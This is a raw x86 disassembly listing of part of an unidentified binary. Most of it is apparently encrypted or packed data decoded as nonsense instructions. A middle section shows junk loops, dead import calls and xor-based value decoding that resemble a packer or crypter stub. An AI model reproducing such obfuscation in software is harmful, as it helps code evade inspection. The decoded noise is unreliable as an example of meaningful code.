  4161df:	test   al,0x8e
  4161e1:	inc    esp
  4161e2:	jo     0x416229
  4161e4:	xchg   edx,eax
  4161e5:	std    
  4161e6:	push   edx
  4161e7:	scas   eax,DWORD PTR es:[edi]
  4161e8:	retf   
  4161e9:	jne    0x416239
  4161eb:	xchg   ecx,eax
  4161ec:	pop    edi
  4161ed:	dec    edi
  4161ee:	std    
  4161ef:	jb     0x416242
  4161f1:	pop    es
  4161f2:	dec    eax
  4161f3:	xchg   ebx,eax
  4161f4:	xchg   edx,eax
  4161f5:	ficom  WORD PTR [edx-0x218cdf79]
  4161fb:	adc    DWORD PTR [eax],edi
  4161fd:	fsubr  QWORD PTR [edi]
  4161ff:	or     BYTE PTR [eax+0x3d],dh
  416202:	outs   dx,BYTE PTR ds:[esi]
  416203:	and    BYTE PTR ds:0xc3ecd467,0x3
  41620a:	jo     0x4161f7
  41620c:	mov    bh,BYTE PTR [edi+0x2f2a27ef]
  416212:	dec    edi
  416213:	mov    edi,0x4cc95be8
  416218:	or     ebx,edx
  41621a:	sub    cl,BYTE PTR [edi+0x7a5b771d]
  416220:	lahf   
  416221:	mov    ch,0x9b
  416223:	loopne 0x4161d0
  416225:	mov    ah,0xe8
  416227:	(bad)  [ebx+0x4a2e7880]
  41622d:	loop   0x416254
  41622f:	lods   eax,DWORD PTR ds:[esi]
  416230:	sub    al,BYTE PTR [esi+0x35230451]
  416236:	aad    0x71
  416238:	or     BYTE PTR [ecx],dl
  41623a:	and    eax,0xc82c93a5
  41623f:	xchg   ebx,eax
  416240:	sti    
  416241:	add    dl,BYTE PTR [edx]
  416243:	pop    edi
  416244:	sbb    al,0xd9
  416246:	sub    dh,BYTE PTR [ebx-0x29]
  416249:	push   esp
  41624a:	push   esi
  41624b:	daa    
  41624c:	xor    eax,0x4cfa28c6
  416251:	mov    dh,0xf5
  416253:	rcl    DWORD PTR [edi-0x42ee392e],0x87
  41625a:	outs   dx,DWORD PTR ds:[esi]
  41625b:	add    esp,DWORD PTR [edi+edx*8]
  41625e:	or     dl,al
  416260:	js     0x4161f1
  416262:	dec    esi
  416263:	cli    
  416264:	test   eax,0x8930d115
  416269:	jl     0x4162be
  41626b:	jmp    0x41624e
  41626d:	jle    0x41621b
  41626f:	add    BYTE PTR [esi+ebx*8+0x673fce5e],0x62
  416277:	in     al,0x8c
  416279:	push   esp
  41627a:	mov    bl,0x98
  41627c:	arpl   WORD PTR [edx],ax
  41627e:	nop
  41627f:	mov    eax,0xa282dd8c
  416284:	ret    0xefdf
  416287:	inc    esi
  416288:	lods   eax,DWORD PTR ds:[esi]
  416289:	addr16 inc ecx
  41628b:	adc    eax,0xd5814e5d
  416290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416291:	inc    ebx
  416292:	test   BYTE PTR [esi],ch
  416294:	aas    
  416295:	fdivr  DWORD PTR [eax+0x52426367]
  41629b:	xchg   BYTE PTR [ebp-0x34],dl
  41629e:	test   DWORD PTR ds:0xc579b740,0x2478539d
  4162a8:	clc    
  4162a9:	mov    eax,0xec575b0d
  4162ae:	ror    DWORD PTR [edi-0x6f13d7e5],1
  4162b4:	outs   dx,BYTE PTR ds:[esi]
  4162b5:	add    esi,DWORD PTR [esi]
  4162b7:	sbb    al,0x6b
  4162b9:	add    DWORD PTR [ecx-0x8],0x44
  4162bd:	push   esp
  4162be:	xor    BYTE PTR [edx+0x207132ee],ch
  4162c4:	int3   
  4162c5:	jne    0x4162ba
  4162c7:	int3   
  4162c8:	stc    
  4162c9:	xlat   BYTE PTR ds:[ebx]
  4162ca:	sti    
  4162cb:	pop    es
  4162cc:	lahf   
  4162cd:	mov    bh,0x7b
  4162cf:	sub    DWORD PTR ds:0x7a91ba32,ebx
  4162d5:	jl     0x416343
  4162d7:	(bad)  
  4162d8:	out    0xa7,eax
  4162da:	sub    ebp,edi
  4162dc:	popa   
  4162dd:	shr    DWORD PTR [eax+0x47],0x31
  4162e1:	out    dx,al
  4162e2:	scas   eax,DWORD PTR es:[edi]
  4162e3:	xor    al,0x87
  4162e5:	jl     0x416297
  4162e7:	in     al,dx
  4162e8:	pop    esp
  4162e9:	ss jecxz 0x4162ef
  4162ec:	mov    ah,0xf
  4162ee:	out    0xa4,al
  4162f0:	add    eax,0xa93a3b63
  4162f5:	sub    eax,0x257390d2
  4162fa:	out    0x94,eax
  4162fc:	adc    al,0xc8
  4162fe:	ins    BYTE PTR es:[edi],dx
  4162ff:	fwait
  416300:	cmp    eax,0x2d551f84
  416305:	mov    bl,0x4c
  416307:	int    0xb5
  416309:	xor    BYTE PTR [ebx-0x2e6c634],al
  41630f:	xlat   BYTE PTR ds:[ebx]
  416310:	jle    0x4162ba
  416312:	test   eax,0x8cba90f0
  416317:	outs   dx,BYTE PTR ds:[esi]
  416318:	loope  0x4162f8
  41631a:	cmp    al,0xb7
  41631c:	loope  0x4162be
  41631e:	push   ebx
  41631f:	es mov eax,fs
  416322:	pop    esp
  416323:	fidivr DWORD PTR [ebp-0x1]
  416326:	arpl   WORD PTR [ebp+0x4b0ddd48],bx
  41632c:	sar    BYTE PTR [ebx],cl
  41632e:	fs dec esp
  416330:	push   esp
  416331:	rol    DWORD PTR [edi],1
  416333:	in     al,dx
  416334:	mul    DWORD PTR [eax-0x7d8bd871]
  41633a:	ss cli 
  41633c:	dec    eax
  41633d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41633e:	push   0xc2c1caec
  416343:	mov    al,ds:0xcaa7a6fa
  416348:	cmovbe esp,esp
  41634b:	cmp    al,0x5
  41634d:	inc    edi
  41634e:	mov    edi,0xc9f874e6
  416353:	ins    DWORD PTR es:[edi],dx
  416354:	jno    0x416307
  416356:	mov    BYTE PTR [esi+ebp*8],ch
  416359:	xor    BYTE PTR ds:0x62ce5f0c,al
  41635f:	es mov esi,0xb0dd0166
  416365:	xchg   ecx,eax
  416366:	xchg   esp,eax
  416367:	mov    ds:0xb718b4a1,eax
  41636c:	shl    ebp,0xc3
  41636f:	(bad)  [eax]
  416371:	jge    0x4163b5
  416373:	popf   
  416374:	and    BYTE PTR [ebp+0x38cbb30e],bh
  41637a:	scas   al,BYTE PTR es:[edi]
  41637b:	add    eax,0xb6fb7d23
  416380:	test   eax,0x335fa702
  416385:	test   DWORD PTR [ebx+0x29],edi
  416388:	adc    eax,0x553179c3
  41638d:	dec    esi
  41638e:	aam    0x25
  416390:	jmp    0x416342
  416392:	std    
  416393:	push   ebp
  416394:	or     DWORD PTR [eax+0x41c919c0],ebp
  41639a:	pop    ss
  41639b:	popf   
  41639c:	inc    ebp
  41639d:	div    BYTE PTR [ebp+0x3c]
  4163a0:	cs stos DWORD PTR es:[edi],eax
  4163a2:	pop    es
  4163a3:	jp     0x416369
  4163a5:	pop    ebx
  4163a6:	dec    esi
  4163a7:	xor    DWORD PTR [ebx+0x59],ebx
  4163aa:	mov    esp,0xf03dcb8c
  4163af:	pop    edi
  4163b0:	xchg   DWORD PTR [edi+0x6dc894e7],edx
  4163b6:	mov    ebx,edi
  4163b8:	popf   
  4163b9:	mov    cl,0xe6
  4163bb:	jae    0x416343
  4163bd:	sub    BYTE PTR [ebx-0x1d],ch
  4163c0:	das    
  4163c1:	adc    edi,DWORD PTR [edi+0x7a793f99]
  4163c7:	aad    0xe2
  4163c9:	popa   
  4163ca:	xchg   ecx,eax
  4163cb:	pusha  
  4163cc:	dec    ebp
  4163cd:	or     al,0xb9
  4163cf:	or     BYTE PTR [edi+edx*4-0xa],dh
  4163d3:	loope  0x416355
  4163d5:	cmp    bh,BYTE PTR [ecx+eax*2+0x1b]
  4163d9:	imul   ebx,DWORD PTR [edx-0x6c],0xb08a364e
  4163e0:	retf   
  4163e1:	or     eax,DWORD PTR [eax+0x394b3283]
  4163e7:	out    0xc2,al
  4163e9:	jns    0x416469
  4163eb:	pushf  
  4163ec:	bound  ecx,QWORD PTR [ecx]
  4163ee:	fistp  WORD PTR [eax-0x5c2db8cd]
  4163f4:	xchg   esp,eax
  4163f5:	dec    ebx
  4163f6:	jnp    0x4163e9
  4163f8:	addr16 pop ebx
  4163fa:	aad    0xd9
  4163fc:	bound  esi,QWORD PTR [ecx+0x4df352bc]
  416402:	mov    al,ds:0x46c7e6c0
  416407:	or     BYTE PTR [ecx-0x55],bl
  41640a:	cwde   
  41640b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41640c:	adc    al,0x8c
  41640e:	sub    al,0x14
  416410:	into   
  416411:	rcl    esi,cl
  416413:	(bad)  [eax+0x62]
  416416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416417:	lods   al,BYTE PTR ds:[esi]
  416418:	mov    esp,0xe9d46902
  41641d:	sar    BYTE PTR [ebx-0xf],1
  416420:	into   
  416421:	in     eax,0xca
  416423:	imul   edi,eax,0x5f
  416426:	lea    ecx,[ebx+0x31]
  416429:	out    dx,eax
  41642a:	jmp    0xd6d3:0xf5c0de3a
  416431:	jb     0x4163d7
  416433:	rcl    DWORD PTR [edi*1+0x4d7265c8],cl
  41643a:	cld    
  41643b:	dec    eax
  41643c:	push   ebx
  41643d:	lahf   
  41643e:	mov    ebp,0x916f60e1
  416443:	add    cl,BYTE PTR [edx+0x125b95f1]
  416449:	inc    ebx
  41644a:	je     0x416474
  41644c:	cwde   
  41644d:	loope  0x4164c6
  41644f:	mov    bh,0xa0
  416451:	sbb    eax,0x2d37e073
  416456:	mov    cl,0x23
  416458:	dec    ebx
  416459:	mov    ecx,0x3021429f
  41645e:	xchg   BYTE PTR [ebp-0x7f],al
  416461:	shl    DWORD PTR [edx+0x10],1
  416464:	xor    BYTE PTR [edi-0x60d1f140],dh
  41646a:	aaa    
  41646b:	ins    DWORD PTR es:[edi],dx
  41646c:	mov    ch,0xd1
  41646e:	inc    ecx
  41646f:	pushf  
  416470:	aas    
  416471:	inc    eax
  416472:	aas    
  416473:	fsub   QWORD PTR [edx+0x1d]
  416476:	jae    0x41641f
  416478:	int3   
  416479:	push   ds
  41647a:	dec    esp
  41647b:	xchg   edi,eax
  41647c:	mov    ebx,0x1ed89921
  416481:	push   edi
  416482:	push   ecx
  416483:	push   ebx
  416484:	and    DWORD PTR [ebp-0x1f],edi
  416487:	addr16 int3 
  416489:	mov    ah,0xf1
  41648b:	leave  
  41648c:	pushf  
  41648d:	mov    bl,0xdd
  41648f:	xchg   edi,eax
  416490:	add    BYTE PTR [ebx+edi*1-0x401191a1],ch
  416497:	test   al,ch
  416499:	mov    dl,BYTE PTR [edi+esi*8+0x2d366dc4]
  4164a0:	mov    ebp,0x8c798315
  4164a5:	mov    edx,0x45ddd9
  4164aa:	imul   edx,DWORD PTR [ecx],0xffffffff
  4164ad:	fdiv   QWORD PTR [edi]
  4164af:	js     0x4164db
  4164b1:	fiadd  WORD PTR [ecx-0x43]
  4164b4:	cmp    ah,bl
  4164b6:	mov    ecx,0x2fde09d4
  4164bb:	daa    
  4164bc:	pop    ebx
  4164bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164be:	adc    BYTE PTR [esi-0x2d],bl
  4164c1:	cli    
  4164c2:	mov    edx,0xb7c09938
  4164c7:	xchg   edi,eax
  4164c8:	out    0xde,eax
  4164ca:	mov    al,ds:0xb42d1ba6
  4164cf:	mov    ch,0x13
  4164d1:	hlt    
  4164d2:	lahf   
  4164d3:	sub    eax,0xcbd31be9
  4164d8:	jmp    0xab13:0x21cffaab
  4164df:	xchg   ebp,eax
  4164e0:	inc    ebx
  4164e1:	mov    edx,0x8b1b5831
  4164e6:	xor    ebp,DWORD PTR [esi-0x4c1d57c]
  4164ec:	call   0x321:0x562a46cb
  4164f3:	jle    0x416555
  4164f5:	xor    eax,0x7f8eb177
  4164fa:	nop
  4164fb:	inc    esp
  4164fc:	outs   dx,BYTE PTR ds:[esi]
  4164fd:	pop    es
  4164fe:	popf   
  4164ff:	cwde   
  416500:	pop    ebx
  416501:	dec    ecx
  416502:	fsub   QWORD PTR [esi]
  416504:	shr    al,cl
  416506:	xor    al,0xcf
  416508:	aas    
  416509:	jb     0x41650c
  41650b:	std    
  41650c:	xchg   DWORD PTR [ebx-0x6990312e],esi
  416512:	lds    ecx,FWORD PTR [esi+0x5cee4aa7]
  416518:	pop    edi
  416519:	or     al,0xca
  41651b:	add    BYTE PTR [edx-0x31],0x45
  41651f:	jge    0x4164ed
  416521:	lods   eax,DWORD PTR ds:[esi]
  416522:	inc    edi
  416523:	adc    ecx,ecx
  416525:	stos   BYTE PTR es:[edi],al
  416526:	xchg   esi,eax
  416527:	mov    ah,0x82
  416529:	sti    
  41652a:	pop    ecx
  41652b:	shl    DWORD PTR [esi],1
  41652d:	std    
  41652e:	xor    dl,ah
  416530:	inc    eax
  416531:	and    cl,ah
  416533:	out    0x1e,eax
  416535:	jmp    0x49d890dd
  41653a:	aaa    
  41653b:	pop    es
  41653c:	mov    al,ds:0xfb61f62e
  416541:	inc    ebx
  416542:	and    ecx,DWORD PTR [edi]
  416544:	mov    bh,0xc
  416546:	xchg   ecx,eax
  416547:	xor    DWORD PTR ds:0x428ea7,0x428e77
  416551:	xor    ecx,0x8a9b
  416557:	mov    DWORD PTR ds:0x428ea3,0x5f74
  416561:	add    ecx,edi
  416563:	mov    edi,DWORD PTR [ebp-0xc]
  416566:	mov    DWORD PTR ds:0x428e73,0x23ca
  416570:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  416577:	inc    edx
  416578:	mov    ecx,DWORD PTR [ebp-0x10]
  41657b:	mov    DWORD PTR ds:0x428e37,0x4a6a
  416585:	cmp    edx,ecx
  416587:	mov    DWORD PTR ds:0x428e73,0x3902
  416591:	jne    0x414140
  416597:	mov    ecx,DWORD PTR [ebp-0x18]
  41659a:	mov    DWORD PTR ds:0x428ebf,0x19
  4165a4:	cmp    DWORD PTR ds:0x428ebf,0x0
  4165ab:	je     0x4165e3
  4165b1:	cmp    DWORD PTR ds:0x428ebf,0x1d
  4165b8:	jle    0x4165e3
  4165be:	jmp    0x4165d1
  4165c3:	push   DWORD PTR [ebp-0x14]
  4165c6:	push   0x8b92
  4165cb:	call   DWORD PTR ds:0x42a9e3
  4165d1:	mov    edx,DWORD PTR ds:0x428ebf
  4165d7:	dec    edx
  4165d8:	mov    DWORD PTR ds:0x428ebf,edx
  4165de:	jmp    0x4165a4
  4165e3:	mov    edx,DWORD PTR [ebp+0x10]
  4165e6:	and    DWORD PTR ds:0x428e83,0x0
  4165f0:	mov    edi,DWORD PTR ds:0x428e83
  4165f6:	inc    edi
  4165f7:	mov    DWORD PTR ds:0x428e83,edi
  4165fd:	cmp    DWORD PTR ds:0x428e83,0x2c
  416604:	jg     0x416627
  41660a:	jmp    0x41661a
  41660f:	push   0x428e8f
  416614:	call   DWORD PTR ds:0x42a9e7
  41661a:	cmp    DWORD PTR ds:0x428e83,0x1e
  416621:	jb     0x4165f0
  416627:	xor    ecx,eax
  416629:	add    DWORD PTR ds:0x428e97,edx
  41662f:	add    ecx,esi
  416631:	xor    DWORD PTR ds:0x428e57,edx
  416637:	mov    DWORD PTR [edx],ecx
  416639:	sbb    edi,ecx
  41663b:	mov    ecx,DWORD PTR [ebp-0x18]
  41663e:	xor    DWORD PTR ds:0x428ec7,ebx
  416644:	xor    ecx,eax
  416646:	add    ecx,esi
  416648:	mov    DWORD PTR ds:0x428ebb,0x1e
  416652:	cmp    DWORD PTR ds:0x428ebb,0x0
  416659:	je     0x4166a8
  41665f:	cmp    DWORD PTR ds:0x428ebb,0x2
  416666:	jbe    0x4166a8
  41666c:	jmp    0x41667c
  416671:	push   0x71f6
  416676:	call   DWORD PTR ds:0x42a9eb
  41667c:	cmp    DWORD PTR ds:0x428ebb,0x3
  416683:	jne    0x416696
  416689:	mov    edi,DWORD PTR ds:0x428ebb
  41668f:	dec    edi
  416690:	mov    DWORD PTR ds:0x428ebb,edi
  416696:	mov    edi,DWORD PTR ds:0x428ebb
  41669c:	dec    edi
  41669d:	mov    DWORD PTR ds:0x428ebb,edi
  4166a3:	jmp    0x416652
  4166a8:	mov    DWORD PTR [ebp-0xc],ecx
  4166ab:	sbb    DWORD PTR ds:0x428eab,0x39c1
  4166b5:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4166bc:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4166c3:	sbb    edi,ecx
  4166c5:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4166cc:	mov    DWORD PTR ds:0x428e6f,0x17
  4166d6:	cmp    DWORD PTR ds:0x428e6f,0x0
  4166dd:	je     0x41671c
  4166e3:	cmp    DWORD PTR ds:0x428e6f,0x23
  4166ea:	jl     0x41671c
  4166f0:	jmp    0x41670a
  4166f5:	push   0x4cf4
  4166fa:	push   0x428e23
  4166ff:	push   0x15e1
  416704:	call   DWORD PTR ds:0x42a9ef
  41670a:	mov    edi,DWORD PTR ds:0x428e6f
  416710:	dec    edi
  416711:	mov    DWORD PTR ds:0x428e6f,edi
  416717:	jmp    0x4166d6
  41671c:	mov    ecx,DWORD PTR [ebp-0x14]
  41671f:	add    edi,DWORD PTR ds:0x428e3f
  416725:	mov    DWORD PTR [ebp+0x8],ecx
  416728:	sub    edi,0x632b
  41672e:	mov    ecx,DWORD PTR [ebp+0x8]
  416731:	xor    DWORD PTR ds:0x428e53,edi
  416737:	xor    ecx,eax
  416739:	mov    edi,DWORD PTR ds:0x428e9b
  41673f:	adc    DWORD PTR ds:0x428ebb,edi
  416745:	add    ecx,esi
  416747:	mov    edi,DWORD PTR ds:0x428e43
  41674d:	mov    ecx,0x242ebf1
  416752:	mov    edi,0xf641bf2
  416757:	mov    DWORD PTR ds:0x428e77,0x250d
  416761:	je     0x4191f8
  416767:	mov    edx,DWORD PTR [ebp+0x8]
  41676a:	mov    ebx,DWORD PTR [ebp-0x8]
  41676d:	neg    DWORD PTR ds:0x428e8f
  416773:	xor    edx,eax
  416775:	xor    ebx,eax
  416777:	sub    edx,ebx
  416779:	xor    DWORD PTR ds:0x428e63,edx
  41677f:	sub    edx,esi
  416781:	add    DWORD PTR ds:0x428eaf,0x644f
  41678b:	xor    edx,eax
  41678d:	or     DWORD PTR ds:0x428e27,0x4378
  416797:	mov    DWORD PTR [ebp+0x8],edx
  41679a:	and    DWORD PTR ds:0x428e67,0x0
  4167a4:	mov    edx,DWORD PTR ds:0x428e67
  4167aa:	inc    edx
  4167ab:	mov    DWORD PTR ds:0x428e67,edx
  4167b1:	cmp    DWORD PTR ds:0x428e67,0xe
  4167b8:	jl     0x4167f7
  4167be:	jmp    0x4167ce
  4167c3:	push   0x428111
  4167c8:	call   DWORD PTR ds:0x42a9bb
  4167ce:	cmp    DWORD PTR ds:0x428e67,0xd
  4167d5:	jne    0x4167ea
  4167db:	xor    edx,edx
  4167dd:	xor    edx,DWORD PTR ds:0x428e67
  4167e3:	inc    edx
  4167e4:	mov    DWORD PTR ds:0x428e67,edx
  4167ea:	cmp    DWORD PTR ds:0x428e67,0x1e
  4167f1:	jb     0x4167a4
  4167f7:	mov    edx,DWORD PTR [ebp+0x8]
  4167fa:	mov    ebx,DWORD PTR [ebp-0x58]
  4167fd:	adc    DWORD PTR ds:0x428eaf,0x428e9b
  416807:	add    edx,0x5708e4
  41680d:	imul   edx,ebx
  416810:	mov    ebx,DWORD PTR ds:0x428e87
  416816:	or     DWORD PTR ds:0x428e57,ebx
  41681c:	mov    DWORD PTR [ebp-0x58],edx
  41681f:	mov    edx,DWORD PTR ds:0x42976f
  416825:	mov    ebx,DWORD PTR ds:0x429bef
  41682b:	sub    ebx,edx
  41682d:	xor    edx,DWORD PTR [edx+ebx*1]
  416830:	mov    edx,DWORD PTR [ebp+0x8]
  416833:	mov    ebx,DWORD PTR [ebp-0x54]
  416836:	xor    DWORD PTR ds:0x428e5b,0x428e83
  416840:	add    edx,0x64f882
  416846:	and    DWORD PTR ds:0x428eab,0x41a4
  416850:	or     edx,ebx
  416852:	and    DWORD PTR ds:0x428e53,0x0
  41685c:	mov    ebx,DWORD PTR ds:0x428e53
  416862:	inc    ebx
  416863:	mov    DWORD PTR ds:0x428e53,ebx
  416869:	cmp    DWORD PTR ds:0x428e53,0x1d
  416870:	ja     0x416893
  416876:	jmp    0x416886
  41687b:	push   0x42815b
  416880:	call   DWORD PTR ds:0x42a9bf
  416886:	cmp    DWORD PTR ds:0x428e53,0x11
  41688d:	jb     0x41685c
  416893:	mov    DWORD PTR [ebp-0x54],edx
  416896:	mov    DWORD PTR ds:0x428e83,0x1e
  4168a0:	cmp    DWORD PTR ds:0x428e83,0x0
  4168a7:	je     0x4168f8
  4168ad:	cmp    DWORD PTR ds:0x428e83,0xe
  4168b4:	jb     0x4168f8
  4168ba:	jmp    0x4168ca
  4168bf:	push   0x8096
  4168c4:	call   DWORD PTR ds:0x42a9c3
  4168ca:	cmp    DWORD PTR ds:0x428e83,0xf
  4168d1:	jne    0x4168e6
  4168d7:	xor    edx,edx
  4168d9:	add    edx,DWORD PTR ds:0x428e83
  4168df:	dec    edx
  4168e0:	mov    DWORD PTR ds:0x428e83,edx
  4168e6:	mov    edx,DWORD PTR ds:0x428e83
  4168ec:	dec    edx
  4168ed:	mov    DWORD PTR ds:0x428e83,edx
  4168f3:	jmp    0x4168a0
  4168f8:	mov    edx,DWORD PTR [ebp+0x8]
  4168fb:	mov    ebx,DWORD PTR [ebp-0x50]
  4168fe:	sub    DWORD PTR ds:0x428e8b,0x428e67
  416908:	add    edx,ecx
  41690a:	xor    edx,ebx
  41690c:	xor    DWORD PTR ds:0x428e73,0x75fe
  416916:	mov    DWORD PTR [ebp-0x50],edx
  416919:	sbb    DWORD PTR ds:0x428eaf,0x1c33
  416923:	mov    edx,DWORD PTR [ebp+0x8]
  416926:	adc    DWORD PTR ds:0x428e4b,edx
  41692c:	mov    ebx,DWORD PTR [ebp-0x4c]
  41692f:	sbb    DWORD PTR ds:0x428e73,0x359
  416939:	add    edx,edi
  41693b:	add    DWORD PTR ds:0x428e33,0x428e43
  416945:	and    edx,ebx
  416947:	movzx  ebx,WORD PTR ds:0x428e3b
  41694e:	xor    DWORD PTR ds:0x428eb7,ebx
  416954:	mov    DWORD PTR [ebp-0x4c],edx
  416957:	add    ebx,DWORD PTR ds:0x428ebf
  41695d:	mov    edx,DWORD PTR [ebp+0x8]
  416960:	or     ebx,DWORD PTR ds:0x428e33
  416966:	mov    ebx,DWORD PTR [ebp-0x48]
  416969:	lea    edx,[ebx+edx*1+0x241fcdf]
  416970:	xor    DWORD PTR ds:0x428eab,0x519b
  41697a:	mov    DWORD PTR [ebp-0x48],edx
  41697d:	mov    edx,DWORD PTR [ebp+0x8]
  416980:	and    DWORD PTR ds:0x428eab,0x0
  41698a:	jmp    0x41699e
  41698f:	xor    ebx,ebx
  416991:	or     ebx,DWORD PTR ds:0x428eab
  416997:	inc    ebx
  416998:	mov    DWORD PTR ds:0x428eab,ebx
  41699e:	cmp    DWORD PTR ds:0x428eab,0x1b
  4169a5:	jae    0x4169e7
  4169ab:	cmp    DWORD PTR ds:0x428eab,0xb
  4169b2:	jbe    0x4169e7
  4169b8:	jmp    0x4169c8
  4169bd:	push   0x42815b
  4169c2:	call   DWORD PTR ds:0x42a9cb
  4169c8:	cmp    DWORD PTR ds:0x428eab,0xa
  4169cf:	jne    0x4169e2
  4169d5:	mov    ebx,DWORD PTR ds:0x428eab
  4169db:	inc    ebx
  4169dc:	mov    DWORD PTR ds:0x428eab,ebx
  4169e2:	jmp    0x41698f
  4169e7:	mov    ebx,0xfa5e1522
  4169ec:	or     DWORD PTR ds:0x428e7b,0x3b15
  4169f6:	sub    ebx,edx
  4169f8:	add    ebx,DWORD PTR [ebp-0x44]
  4169fb:	mov    DWORD PTR [ebp-0x44],ebx
  4169fe:	mov    edx,DWORD PTR ds:0x428e8f
  416a04:	xor    edx,DWORD PTR ds:0x428e27
  416a0a:	mov    DWORD PTR ds:0x428e8f,edx
  416a10:	mov    edx,DWORD PTR [ebp+0x8]
  416a13:	xor    edx,eax
  416a15:	add    edx,esi
  416a17:	jne    0x416767
  416a1d:	mov    DWORD PTR ds:0x428ea3,0x25d2
  416a27:	jmp    0x4191f8
  416a2c:	mov    edx,DWORD PTR [ebp-0xc]
  416a2f:	xor    ebx,ebx
  416a31:	or     ebx,DWORD PTR ds:0x428ea3
  416a37:	xor    ebx,DWORD PTR ds:0x428ea7
  416a3d:	mov    DWORD PTR ds:0x428ea3,ebx
  416a43:	sub    edx,esi
  416a45:	xor    edx,eax
  416a47:	sbb    ebx,DWORD PTR ds:0x428e87
  416a4d:	mov    DWORD PTR [ebp-0x5c],edx
  416a50:	jmp    0x418e09
  416a55:	out    0xe2,al
  416a57:	dec    edx
  416a58:	mov    dl,0x46
  416a5a:	stos   BYTE PTR es:[edi],al
  416a5b:	xchg   BYTE PTR [esi+0x2de23c83],dl
  416a61:	pop    es
  416a62:	in     al,0x48
  416a64:	daa    
  416a65:	stc    
  416a66:	inc    esp
  416a67:	add    BYTE PTR [ebx-0x7c7c9f19],0x16
  416a6e:	lods   al,BYTE PTR ds:[esi]
  416a6f:	repz adc bh,bl
  416a72:	xor    esp,DWORD PTR [edx+0x689261d1]
  416a78:	jmp    0xcd5f:0x1ee2b25
  416a7f:	pushf  
  416a80:	xchg   BYTE PTR [ebx+ecx*4],bh
  416a83:	push   eax
  416a84:	cmp    esi,DWORD PTR [eax]
  416a86:	in     al,0x4f
  416a88:	lods   eax,DWORD PTR ds:[esi]
  416a89:	pop    es
  416a8a:	fs ins DWORD PTR es:[edi],dx
  416a8c:	xchg   ebp,eax
  416a8d:	jle    0x416ade
  416a8f:	mov    eax,0xb8e6f420
  416a94:	push   esi
  416a95:	ja     0x416a99
  416a97:	nop
  416a98:	mov    ds:0x9e85b978,al
  416a9d:	icebp  
  416a9e:	inc    esi
  416a9f:	test   DWORD PTR [ebx+ecx*4-0x74],esi
  416aa3:	xchg   ebp,eax
  416aa4:	xchg   edi,eax
  416aa5:	in     al,0xa0
  416aa7:	inc    ebp
  416aa8:	jne    0x416ae4
  416aaa:	(bad)  [ecx-0x4e1b20d4]
  416ab0:	pop    esp
  416ab1:	jns    0x416abe
  416ab3:	sbb    edi,DWORD PTR [ecx+eax*2-0x18]
  416ab7:	cld    
  416ab8:	scas   eax,DWORD PTR es:[edi]
  416ab9:	rcl    BYTE PTR [ebx],cl
  416abb:	es jb  0x416ae6
  416abe:	xchg   esp,eax
  416abf:	(bad)  
  416ac0:	fld    DWORD PTR ds:0xf7c30bad
  416ac6:	retf   
  416ac7:	cwde   
  416ac8:	mov    eax,ds:0xcf426864
  416acd:	sub    ecx,0x6d77ac85
  416ad3:	sub    eax,0xc3886b4
  416ad8:	pop    es
  416ad9:	mov    es,WORD PTR [esi+0x5b]
  416adc:	das    
  416add:	or     al,0x1b
  416adf:	push   ebx
  416ae0:	lock mov bl,0xea
  416ae3:	xchg   ecx,eax
  416ae4:	push   edx
  416ae5:	push   ds
  416ae6:	icebp  
  416ae7:	repz add bl,bl
  416aea:	(bad)  
  416aeb:	pushf  
  416aec:	and    eax,0x5d0cb179
  416af1:	dec    esp
  416af2:	pop    ss
  416af3:	jo     0x416a7c
  416af5:	in     eax,0x94
  416af7:	adc    dh,BYTE PTR [ebp+0x41]
  416afa:	sub    BYTE PTR [ecx+edx*8-0x514639ff],bh
  416b01:	xchg   BYTE PTR [edx-0x5c],ah
  416b04:	xor    BYTE PTR [esi-0x48],bh
  416b07:	arpl   WORD PTR [ecx],dx
  416b09:	dec    BYTE PTR [eax+0x711a39d8]
  416b0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b10:	fcom   QWORD PTR [esi+0x6450038d]
  416b16:	bound  ebp,QWORD PTR [eax-0x4f36848b]
  416b1c:	jmp    0xfd75:0x4fbd3d5f
  416b23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b24:	fidivr DWORD PTR [ebp+0x33d0ad8c]
  416b2a:	mov    esp,0x80deb1ae
  416b2f:	ficomp WORD PTR [ebx-0x1d]
  416b32:	ror    DWORD PTR [edi+0x45fe7002],1
  416b38:	xchg   edx,eax
  416b39:	xor    esi,DWORD PTR [esi+edi*8+0xe6297f1]
  416b40:	pushf  
  416b41:	jnp    0x416b21
  416b43:	loope  0x416acf
  416b45:	mov    esi,0x84cd44d1
  416b4a:	adc    ch,0x61
  416b4d:	push   ebp
  416b4e:	aam    0x44
  416b50:	iret   
  416b51:	push   cs
  416b52:	fcomp  QWORD PTR [edi+edx*1-0x4d28439d]
  416b59:	fimul  DWORD PTR ds:0xe63d2c9
  416b5f:	shl    BYTE PTR ds:[edx+0x20e8d70f],cl
  416b66:	lahf   
  416b67:	mov    es,WORD PTR [ebp-0x7dcf0e35]
  416b6d:	and    eax,0x9f16e1f5
  416b72:	and    dl,0xa7
  416b75:	cmp    al,ah
  416b77:	mov    BYTE PTR [edx-0x20],al
  416b7a:	dec    edx
  416b7b:	aas    
  416b7c:	pop    edi
  416b7d:	(bad)  [edx-0x2f2cdb34]
  416b83:	sub    DWORD PTR [edx],edi
  416b85:	dec    edx
  416b86:	xor    dh,BYTE PTR [esi+0x621067f]
  416b8c:	jnp    0x416b62
  416b8e:	sbb    al,ah
  416b90:	int    0x45
  416b92:	dec    edi
  416b93:	push   ss
  416b94:	pop    es
  416b95:	ds xchg edx,eax
  416b97:	imul   ebx,DWORD PTR [ebp-0x582291eb],0x19b38e67
  416ba1:	sub    BYTE PTR [ebp-0x510449ca],dh
  416ba7:	add    esp,edx
  416ba9:	mov    edx,0x1d7670e5
  416bae:	dec    esi
  416baf:	or     DWORD PTR [ebx-0x2b],0x96b2236a
  416bb6:	dec    eax
  416bb7:	in     eax,0x76
  416bb9:	add    ebp,eax
